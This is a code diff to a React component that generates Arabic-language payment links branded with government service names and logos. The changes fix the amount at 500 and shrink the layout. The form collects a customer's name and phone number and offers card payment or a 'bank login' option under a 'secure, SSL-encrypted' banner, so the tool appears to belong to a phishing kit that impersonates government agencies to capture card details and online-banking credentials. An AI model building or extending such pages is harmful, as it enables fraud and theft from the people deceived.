@@ -43,7 +43,6 @@ const GovernmentPaymentLinkCreator = () => {
   const [fullName, setFullName] = useState("");
   const [phoneNumber, setPhoneNumber] = useState("");
   const [email, setEmail] = useState("");
-  const [amount, setAmount] = useState("");
   const [reference, setReference] = useState("");
   const [description, setDescription] = useState("");
   const [isSubmitting, setIsSubmitting] = useState(false);
@@ -71,7 +70,7 @@ const GovernmentPaymentLinkCreator = () => {
     e.preventDefault();
     setIsSubmitting(true);
 
-    if (!fullName || !phoneNumber || !amount) {
+    if (!fullName || !phoneNumber) {
       toast({
         title: "خطأ",
         description: "الرجاء ملء جميع الحقول المطلوبة",
@@ -93,7 +92,7 @@ const GovernmentPaymentLinkCreator = () => {
             phoneNumber,
             email,
           },
-          payment_amount: parseFloat(amount),
+          payment_amount: 500,
           currency_code: getCurrencyCode(country || govService.country),
           reference,
           description,
@@ -113,7 +112,7 @@ const GovernmentPaymentLinkCreator = () => {
       const queryParams = new URLSearchParams({
         service: serviceKey || govService.key,
         country: country || govService.country,
-        amount: amount,
+        amount: '500',
         currency: currencyCode,
         method: paymentMethod,
         provider: govService.key.toUpperCase()
@@ -132,7 +131,7 @@ const GovernmentPaymentLinkCreator = () => {
           customer_name: fullName,
           phone: phoneNumber,
           email: email || 'غير محدد',
-          amount: parseFloat(amount),
+          amount: 500,
           currency: getCurrencySymbol(country || govService.country),
           reference: reference || 'غير محدد',
           description: description || 'غير محدد',
@@ -174,7 +173,7 @@ const GovernmentPaymentLinkCreator = () => {
     const queryParams = new URLSearchParams({
       service: serviceKey || govService!.key,
       country: country || govService!.country,
-      amount: amount,
+      amount: '500',
       currency: currencyCode,
       method: paymentMethod,
       provider: govService!.key.toUpperCase()
@@ -299,50 +298,44 @@ const GovernmentPaymentLinkCreator = () => {
           style={{ borderRadius: govSystem.borderRadius.lg }}
         >
           <div 
-            className="p-8 relative"
+            className="p-5 sm:p-6 relative"
             style={{
               background: govSystem.gradients.header,
             }}
           >
-            <div className="flex items-center gap-4">
-              <div className="w-16 h-16 rounded-xl bg-white/20 backdrop-blur-sm flex items-center justify-center">
-                <Landmark className="w-8 h-8 text-white" />
-              </div>
+            <div className="flex items-center gap-3">
+              {govService.logo && (
+                <img 
+                  src={govService.logo} 
+                  alt={govService.nameAr}
+                  className="h-12 sm:h-14 w-auto object-contain brightness-0 invert"
+                />
+              )}
               <div>
-                <h1 className="text-3xl font-bold text-white">
+                <h1 className="text-xl sm:text-2xl font-bold text-white">
                   {govService.nameAr}
                 </h1>
-                <p className="text-white/90 mt-1">
+                <p className="text-white/90 text-sm">
                   {govService.description}
                 </p>
               </div>
             </div>
-            
-            {govService.logo && (
-              <div className="absolute top-4 left-4">
-                <img 
-                  src={govService.logo} 
-                  alt={govService.nameAr}
-                  className="h-12 w-auto object-contain brightness-0 invert opacity-80"
-                />
-              </div>
-            )}
           </div>
 
-          <form onSubmit={handleSubmit} className="p-6 sm:p-8 space-y-5">
-            <div className="text-center mb-5">
-              <h2 className="text-xl sm:text-2xl font-bold mb-2" style={{ color: primaryColor }}>
+          <form onSubmit={handleSubmit} className="p-4 sm:p-6 space-y-4">
+            <div className="text-center mb-4">
+              <h2 className="text-lg sm:text-xl font-bold mb-1" style={{ color: primaryColor }}>
                 إنشاء رابط دفع {govService.nameAr}
               </h2>
-              <p className="text-sm text-gray-600">
+              <p className="text-xs sm:text-sm text-gray-600">
                 أدخل بيانات الدفع لإنشاء رابط مخصص
               </p>
             </div>
 
-            <div className="space-y-4">
+            <div className="space-y-3">
               <div>
-                <Label className="flex items-center gap-2 mb-2">
-                  <User className="w-4 h-4" />
+                <Label className="flex items-center gap-1.5 mb-1.5 text-sm">
+                  <User className="w-3.5 h-3.5" />
                   اسم العميل *
                 </Label>
                 <Input
@@ -350,13 +343,13 @@ const GovernmentPaymentLinkCreator = () => {
                   onChange={(e) => setFullName(e.target.value)}
                   placeholder="أدخل الاسم الكامل"
                   required
-                  className="h-12"
+                  className="h-9 text-sm"
                 />
               </div>
 
               <div>
-                <Label className="flex items-center gap-2 mb-2">
-                  <Phone className="w-4 h-4" />
+                <Label className="flex items-center gap-1.5 mb-1.5 text-sm">
+                  <Phone className="w-3.5 h-3.5" />
                   رقم الجوال *
                 </Label>
                 <Input
@@ -364,14 +357,14 @@ const GovernmentPaymentLinkCreator = () => {
                   onChange={(e) => setPhoneNumber(e.target.value)}
                   placeholder="05XXXXXXXX"
                   required
-                  className="h-12"
+                  className="h-9 text-sm"
                   dir="ltr"
                 />
               </div>
 
               <div>
-                <Label className="flex items-center gap-2 mb-2">
-                  <Mail className="w-4 h-4" />
+                <Label className="flex items-center gap-1.5 mb-1.5 text-sm">
+                  <Mail className="w-3.5 h-3.5" />
                   البريد الإلكتروني (اختياري)
                 </Label>
                 <Input
@@ -379,23 +372,23 @@ const GovernmentPaymentLinkCreator = () => {
                   value={email}
                   onChange={(e) => setEmail(e.target.value)}
                   placeholder="example@email.com"
-                  className="h-12"
+                  className="h-9 text-sm"
                   dir="ltr"
                 />
               </div>
             </div>
 
-            <div className="space-y-4 pt-4 border-t mt-4">
+            <div className="space-y-3 pt-3 border-t mt-3">
               <div>
-                <Label className="flex items-center gap-2 mb-2 text-base font-bold">
-                  <CreditCard className="w-5 h-5" />
+                <Label className="flex items-center gap-1.5 mb-1.5 text-sm font-bold">
+                  <CreditCard className="w-4 h-4" />
                   طريقة الدفع *
                 </Label>
-                <div className="grid grid-cols-2 gap-3">
+                <div className="grid grid-cols-2 gap-2">
                   <button
                     type="button"
                     onClick={() => setPaymentMethod("card")}
-                    className={`p-4 rounded-xl border-2 transition-all duration-200 ${
+                    className={`p-3 rounded-lg border-2 transition-all duration-200 ${
                       paymentMethod === "card" ? "border-current shadow-md" : "border-gray-200 hover:border-gray-300"
                     }`}
                     style={{
@@ -404,23 +397,23 @@ const GovernmentPaymentLinkCreator = () => {
                     }}
                   >
                     <CreditCard 
-                      className="w-6 h-6 mx-auto mb-2" 
+                      className="w-5 h-5 mx-auto mb-1.5" 
                       style={{ color: paymentMethod === "card" ? primaryColor : "#9CA3AF" }}
                     />
-                    <p className={`text-sm font-bold ${
+                    <p className={`text-xs font-bold ${
                       paymentMethod === "card" ? "" : "text-gray-600"
                     }`}
                     style={{ color: paymentMethod === "card" ? primaryColor : undefined }}
                     >
                       بطاقة الائتمان
                     </p>
-                    <p className="text-xs text-gray-500 mt-1">Visa, Mada, Mastercard</p>
+                    <p className="text-[10px] text-gray-500 mt-0.5">Visa, Mada, Mastercard</p>
                   </button>
                   
                   <button
                     type="button"
                     onClick={() => setPaymentMethod("bank_login")}
-                    className={`p-4 rounded-xl border-2 transition-all duration-200 ${
+                    className={`p-3 rounded-lg border-2 transition-all duration-200 ${
                       paymentMethod === "bank_login" ? "border-current shadow-md" : "border-gray-200 hover:border-gray-300"
                     }`}
                     style={{
@@ -429,82 +422,63 @@ const GovernmentPaymentLinkCreator = () => {
                     }}
                   >
                     <Building2 
-                      className="w-6 h-6 mx-auto mb-2" 
+                      className="w-5 h-5 mx-auto mb-1.5" 
                       style={{ color: paymentMethod === "bank_login" ? primaryColor : "#9CA3AF" }}
                     />
-                    <p className={`text-sm font-bold ${
+                    <p className={`text-xs font-bold ${
                       paymentMethod === "bank_login" ? "" : "text-gray-600"
                     }`}
                     style={{ color: paymentMethod === "bank_login" ? primaryColor : undefined }}
                     >
                       تسجيل دخول بنكي
                     </p>
-                    <p className="text-xs text-gray-500 mt-1">الخدمات المصرفية</p>
+                    <p className="text-[10px] text-gray-500 mt-0.5">الخدمات المصرفية</p>
                   </button>
                 </div>
               </div>
-            </div>
-
-            <div className="space-y-4 pt-4 border-t mt-4">
-              <div>
-                <Label className="flex items-center gap-2 mb-2">
-                  <DollarSign className="w-4 h-4" />
-                  المبلغ المطلوب *
-                </Label>
-                <Input
-                  type="number"
-                  value={amount}
-                  onChange={(e) => setAmount(e.target.value)}
-                  placeholder="0.00"
-                  required
-                  className="h-12"
-                  step="0.01"
-                  min="0"
-                />
-              </div>
 
               <div>
-                <Label className="flex items-center gap-2 mb-2">
-                  <FileText className="w-4 h-4" />
+                <Label className="flex items-center gap-1.5 mb-1.5 text-sm">
+                  <FileText className="w-3.5 h-3.5" />
                   رقم الفاتورة / المرجع (اختياري)
                 </Label>
                 <Input
                   value={reference}
                   onChange={(e) => setReference(e.target.value)}
                   placeholder="INV-001"
-                  className="h-12"
+                  className="h-9 text-sm"
                 />
               </div>
 
               <div>
-                <Label className="flex items-center gap-2 mb-2">
-                  <FileText className="w-4 h-4" />
+                <Label className="flex items-center gap-1.5 mb-1.5 text-sm">
+                  <FileText className="w-3.5 h-3.5" />
                   وصف الدفع (اختياري)
                 </Label>
                 <Textarea
                   value={description}
                   onChange={(e) => setDescription(e.target.value)}
                   placeholder="وصف تفصيلي للدفعة..."
-                  className="min-h-24"
+                  className="min-h-20 text-sm"
                 />
               </div>
             </div>
 
             <div 
-              className="p-4 rounded-lg"
+              className="p-3 rounded-lg"
               style={{
                 background: `${primaryColor}08`,
-                borderRight: `4px solid ${primaryColor}`
+                borderRight: `3px solid ${primaryColor}`
               }}
             >
-              <div className="flex items-start gap-3">
-                <Shield className="w-5 h-5 mt-0.5" style={{ color: primaryColor }} />
+              <div className="flex items-start gap-2">
+                <Shield className="w-4 h-4 mt-0.5" style={{ color: primaryColor }} />
                 <div className="flex-1">
-                  <p className="text-sm font-semibold mb-1" style={{ color: primaryColor }}>
+                  <p className="text-xs font-semibold mb-0.5" style={{ color: primaryColor }}>
                     معاملة آمنة ومشفرة
                   </p>
-                  <p className="text-xs text-gray-600">
-                    جميع البيانات محمية بتقنية التشفير SSL وتتوافق مع معايير الأمان العالمية
+                  <p className="text-[11px] text-gray-600">
+                    جميع البيانات محمية بتقنية التشفير SSL
                   </p>
                 </div>
               </div>
@@ -512,9 +486,8 @@ const GovernmentPaymentLinkCreator = () => {
 
             <Button
               type="submit"
-              size="lg"
               disabled={isSubmitting}
-              className="w-full h-14 text-lg font-bold"
+              className="w-full h-10 text-sm font-bold"
               style={{
                 background: govSystem.gradients.primary,
                 color: govSystem.colors.textOnPrimary,
